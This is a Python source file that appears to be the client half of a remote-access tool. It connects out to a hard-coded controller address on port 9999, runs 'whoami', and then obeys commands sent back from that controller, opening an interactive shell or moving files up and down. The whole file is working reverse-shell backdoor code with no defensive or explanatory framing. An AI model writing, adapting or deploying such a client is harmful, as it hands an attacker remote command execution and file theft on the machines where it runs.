#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2020/8/15 17:17

import socket
import subprocess
from clientModule.shell import Shell
from misc.encoding import Encode
from clientModule.fileOperation import FileOPT

if __name__ == "__main__":
    # host = "192.168.11.13"
    host = "127.0.0.1"
    port = 9999
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    p = subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    shell = Shell(client)
    while True:
        cmd = client.recv(8192).decode(Encode.encoding)
        if cmd == "shell":
            while True:
                if not shell.shell():
                    break
        elif cmd[:6] == "upload":
            FileOPT(client, cmd).upload()
        elif cmd[:8] == "download":
            FileOPT(client, cmd).download()
        elif cmd in ["quit", "q", "exit"]:
            break
    client.shutdown(2)
    client.close()
